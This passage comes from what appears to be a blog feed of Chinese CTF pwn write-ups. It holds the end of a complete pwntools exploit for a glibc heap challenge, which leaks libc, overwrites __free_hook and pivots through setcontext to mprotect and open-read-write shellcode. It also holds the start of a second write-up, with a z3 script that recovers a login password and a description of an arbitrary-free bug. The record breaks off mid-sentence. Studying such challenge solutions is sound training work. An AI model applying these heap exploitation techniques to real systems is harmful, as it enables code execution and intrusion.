punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'121.40.89.206'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'41232'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">boom</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    context<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'ch:'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span>size <span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size??'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'something'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index?'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'something'</span> <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    <span class=\"token comment\"># $rebase(0x000000000004060)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x250</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x128</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x118</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x128</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x36a0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x118</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n    fake_io <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0xfbad1800</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> fake_io <span class=\"token operator\">+</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n\n    _IO_2_1_stdin_ <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> _IO_2_1_stdin_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span>\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">12</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>__free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    magic <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x00154930</span>\n    setcontext <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'setcontext'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61</span>\n\n    <span class=\"token comment\"># getkeyserv_handle+576</span>\n    <span class=\"token comment\"># &lt;getkeyserv_handle+576>:\tmov    rdx,QWORD PTR [rdi+0x8]</span>\n    <span class=\"token comment\"># &lt;getkeyserv_handle+580>:\tmov    QWORD PTR [rsp],rax</span>\n    <span class=\"token comment\"># &lt;getkeyserv_handle+584>:\tcall   QWORD PTR [rdx+0x20]</span>\n\n    frame <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    frame<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    frame<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xfffffffff000</span>\n    frame<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x1000</span>\n    frame<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">7</span>\n    frame<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'mprotect'</span><span class=\"token punctuation\">]</span>\n    frame<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> __free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x150</span>\n\n    orw_payload <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span>\n    orw_payload <span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n    orw_payload <span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> __free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> magic <span class=\"token punctuation\">,</span> \n        setcontext <span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x150</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x158</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span> orw_payload <span class=\"token punctuation\">)</span> \n    add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">#此方法需要有 mprotect 系统调用</span>\n\n    <span class=\"token comment\"># dbg('free')</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span>\n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># boom(attack)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   easybox.py\n@Time    :   2022/01/17 19:22:01\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "IO_FILE"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/",
            "url": "http://niyah.cn/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/",
            "title": "没有_BUG_的教务系统",
            "date_published": "2022-01-21T02:10:27.000Z",
            "content_html": "<blockquote>\n<p>本题为 2.27-3ubuntu1.4_amd64</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"没有_bug_的教务系统\"><a class=\"markdownIt-Anchor\" href=\"#没有_bug_的教务系统\">#</a> 没有_BUG_的教务系统</h1>\n<p>首先本题目给了 2.27 版本的 libc</p>\n<p>进门就是一个加密验证</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121150502298.png\" alt=\"image-20220121150502298\"></p>\n<p>我们可以通过 z3 来解决加密</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span> BitVec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'x%s'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>  <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">|</span> <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> target<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    m <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    res <span class=\"token operator\">=</span> <span class=\"token builtin\">sorted</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">[</span>d<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> d <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> key <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span>\n        result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> result</code></pre>\n<p>得到密码 p455w0rd</p>\n<p>登录进入系统，这之后就卡了不少时间了，因为实在是找不到漏洞点，之后本着边界值输入的方法在更改密码时输入较长的密码便出了问题</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121151229198.png\" alt=\"image-20220121151229198\"></p>\n<p>这里已经出现问题了，输入较长的密码程序直接崩溃</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121151510999.png\" alt=\"image-20220121151510999\"></p>\n<p>之后经过调试发现是 free 函数出现了问题，这里的 rdi 是一个意外的指针</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121151759332.png\" alt=\"image-20220121151759332\"></p>\n<p>后来再次调试确定偏移为 0x80，那么这里就可以实现一个任意地址 free</p>\n<p>结合程序，每次 passwd 和 stu_num 都会被复制到 bss 段，那么我们可以在 bss 段伪造一个 fake chunk</p>\n<p>通过部分覆盖泄露出堆地址</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121153051127.png\" alt=\"image-20220121153051127\"></p>\n<p>通过任意地址 free 